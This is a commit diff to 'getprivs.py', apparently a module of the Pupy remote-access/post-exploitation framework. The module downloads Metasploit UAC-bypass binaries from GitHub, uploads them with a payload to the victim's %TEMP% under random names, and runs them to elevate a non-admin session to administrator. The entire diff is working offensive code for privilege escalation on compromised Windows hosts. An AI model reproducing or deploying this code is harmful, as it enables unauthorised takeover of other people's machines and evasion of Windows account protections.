2ed46179902002304facf02377b13655229cfe7e
golind <brahui@ruggedinbox.com>
2015-11-06 19:09:51 +0000

    Update getprivs.py

--- pupy/modules/getprivs.py
+++ pupy/modules/getprivs.py
@@ -1,34 +1,59 @@
 # -*- coding: UTF8 -*-
 from pupylib.PupyModule import *
-import urllib
-from memory_exec import MemoryExec
+import pupygen
+from urllib2 import urlopen
+import os
+import random
+import string
+from modules import migrate
+from modules import memory_exec
 
 __class_name__="GetPrivsModule"
 
 class GetPrivsModule(PupyModule):
 	""" try to get SeDebugPrivilege for the current process """
 
+	#https://msdn.microsoft.com/en-us/library/windows/desktop/aa383745%28v=vs.85%29.aspx#macros_for_conditional_declarations
+	#https://msdn.microsoft.com/en-us/library/windows/desktop/ms724833%28v=vs.85%29.aspx
+	win_versions={}
+	win_versions['WIN_10']=(10, 0, 0)
+	win_versions['WIN_SERVER_2016']=(10, 0, 0)
+	win_versions['WIN_8.1']=(6, 3, 0)
+	win_versions['WIN_SERVER_2012_R2']=(6, 3, 0)
+	win_versions['WIN_8']=(6, 2, 0)
+	win_versions['WIN_SERVER_2012']=(6, 2, 0)
+	win_versions['WIN_7_SP1']=(6, 1, 1)
+	win_versions['WIN_7']=(6, 1, 0)
+	win_versions['WIN_SERVER_2008_R2']=(6, 0, 1)
+	win_versions['WIN_SERVER_2008']=(6, 0, 1)
+	win_versions['WIN_VISTA_SP1']=(6, 0, 1)
+	win_versions['WIN_VISTA']=(6, 0, 0)
+	win_versions['WIN_SERVER_2003_SP2']=(5, 2, 2)
+	win_versions['WIN_SERVER_2003_SP1']=(5, 2, 1)
+	win_versions['WIN_SERVER_2003']=(5, 2, 0)
+	win_versions['WIN_XP_SP3']=(5, 1, 3)
+	win_versions['WIN_XP_SP2']=(5, 1, 2)
+	win_versions['WIN_XP_SP1']=(5, 1, 1)
+	win_versions['WIN_XP']=(5, 1, 0)
+
 	def init_argparse(self):
-		self.arg_parser = PupyArgumentParser(prog="getprivs", description=self.__doc__)
-		self.arg_parser.add_argument('-e','--pupy', help='Use an alternative file', completer=path_completer)
-		self.arg_parser.add_argument('-m','--method', choices=['binary,reflective'], required=True, help='UAC bypass method')
+		self.arg_parser=PupyArgumentParser(prog="getprivs", description=self.__doc__)
+		self.arg_parser.add_argument('-e','--pupy', help='Use an alternative file')
+		#self.arg_parser.add_argument('-m','--method', choices=['binary','memexec','reflective'], required=True, help='UAC bypass method')
 
 	@windows_only
 	def is_compatible(self):
 		pass
 
 	def run(self, args):
-		if not os.path.isdir("./tools"):
-			self.error("./tools folder not found...")
-			os.makedirs("./tools")
-			if not os.path.exists("/tools/bypassuac*"):
-				self.error("bypassuac files not found...")
-				bypass_file=["bypassuac-x64.exe","bypassuac-x86.exe","bypassuac-x64.dll","bypassuac-x86.dll"]
-				for bin in bypass_file:
-					bypassuac=urllib.request.urlopen('https://github.com/rapid7/metasploit-framework/blob/master/data/post/'+bin+'?raw=true')
-					f = open(bin,'wb')
-					f.write(bypassuac.read())
-					f.close()
+		bypass_file=["bypassuac-x64.exe","bypassuac-x86.exe","bypassuac-x64.dll","bypassuac-x86.dll"]
+		for bin in bypass_file:
+			if not os.path.exists(bin):
+				self.error(bin + " not found...")
+				bypassuac=urlopen('https://github.com/rapid7/metasploit-framework/blob/master/data/post/'+bin+'?raw=true')
+				f=open(bin,'wb')
+				f.write(bypassuac.read())
+				f.close()
 
 		exebuff=b""
 		if args.pupy:
@@ -48,62 +73,45 @@ class GetPrivsModule(PupyModule):
 
 		self.client.load_package("pupwinutils.security", force=True)
 
-		AdminCheck = self.client.conn.modules["pupwinutils.security"].AdminCheck()
-		UACLevelCheck = self.client.conn.modules["pupwinutils.security"].UACLevelCheck()
-
-		win_old = ['7','Server 2008']
-		win_new = ['8','Server 2012','10']
+		AdminCheck=self.client.conn.modules["pupwinutils.security"].AdminCheck()
 
 		if AdminCheck==False:
-			if UACLevelCheck in range(1,4):
-				self.error("UAC set to always notify, unable to bypassUAC")
-			elif UACLevelCheck==5:
-				self.info("UAC set to default, attempting to bypassUAC")
-				try:
-					self.error("User is not admin, trying bypass UAC...")
-					if args.method=="reflective":
-						if self.client.desc['proc_arch']=="64bit":
-							MemoryExec.args.path = b"./tools/bypassuac-x64.dll"
-						else:
-							MemoryExec.args.path = b"./tools/bypassuac-x86.dll"
-							self.error("reflective elevation is work in progress, please use binary elevation, exiting...")
+			self.info("Not ADMIN, attempting to bypassUAC")
+			try:
+				#if args.method=="binary":
+				if self.client.desc['proc_arch']=="64bit":
+					bpuac=os.path.join(os.getcwd(),b"bypassuac-x64.exe")
+				else:
+					bpuac=os.path.join(os.getcwd(),b"bypassuac-x86.exe")
 
-					if args.method=="binary":
-						if self.client.desc['proc_arch']=="64bit":
-							bpuacbuff = b"./tools/bypassuac-x64.exe"
-						else:
-							bpuacbuff = b"./tools/bypassuac-x86.exe"
+				with open(bpuac,'rb') as f:
+					bpuacbuff=f.read()
 
-						remote_path = {'bypass':'','pupy':''}
-						for i in remote_path:
-							####file upload:
-							remote_path[i]=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
-							self.info("uploading to %s ..."%remote_path[i])
-							#uploading
-							rf=self.client.conn.builtin.open(remote_path[i], "wb")
-							chunk_size=16000
-							pos=0
-							while True:
-								buf=bpuacbuff[pos:pos+chunk_size] if i == 0 else exebuff[pos:pos+chunk_size]
-								if not buf:
-									break
-								rf.write(buf)
-								pos+=chunk_size
-							rf.close()
-							self.success("upload successful")
+				remote_path={'bypass':'','pupy':''}
+				for k in remote_path.keys():
+					remote_path[k]=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
+					self.info("uploading %s to %s ..."%(k,remote_path[k]))
+					#uploading
+					rf=self.client.conn.builtin.open(remote_path[k], "wb")
 
-						self.client.conn.modules["pupwinutils.security"].ByPassUAC(remote_path['bypass'], remote_path['pupy'])
+					chunk_size=16000
+					pos=0
 
-					self.success("User is admin, can elevate privilages to SYSTEM !")
-					try:
-						self.client.conn.modules["pupwinutils.security"].RunAsSystem()
-						self.success("Stuff enabled !")
-					except:
-						self.error("Could not run as SYSTEM...")
-				except:
-					self.error("Could not elevate privilages to ADMIN")
-			elif UACLevelCheck==0:
-				self.info("UAC set to DoNotPrompt - use ShellExecute method instead")
+					self.info("working %s ..."%k)
+					while True:
+						if k=='pupy':
+							buf=exebuff[pos:pos+chunk_size]
+						elif k=='bypass':
+							buf=bpuacbuff[pos:pos+chunk_size]
+						if not buf:
+							break
+						rf.write(buf)
+						pos+=chunk_size
+					rf.close()
+					self.success("upload successful")
+				print remote_path['bypass'], remote_path['pupy']
+				self.client.conn.modules["pupwinutils.security"].ByPassUAC_bin(remote_path['bypass'], remote_path['pupy'])
+				self.success("ADMIN stuff enabled !")
 
-		self.info("Running as: ",self.client.conn.modules["pupwinutils.security"].RunAsSystem().GetUserName())
-
+			except:
+				self.error("Could not elevate privilages to ADMIN")
